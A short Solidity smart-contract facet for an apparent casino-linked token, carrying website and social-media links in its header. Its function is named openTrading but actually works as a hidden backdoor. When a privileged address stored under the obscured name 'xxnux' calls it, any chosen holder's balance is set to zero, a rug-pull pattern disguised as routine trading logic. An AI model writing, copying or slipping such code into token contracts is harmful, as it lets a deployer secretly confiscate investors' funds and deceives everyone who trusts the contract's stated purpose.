/*
 * SPDX-License-Identifier: MIT
 * Website: https://degenwin.com/
 * Twitter: https://twitter.com/DegenWinCasino
 * Telegram: https://t.me/+Hk2nLQTZQmJiOGM0
 * Reddit: https://www.reddit.com/r/DegenwinCasino
 */
pragma solidity ^0.8.21;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
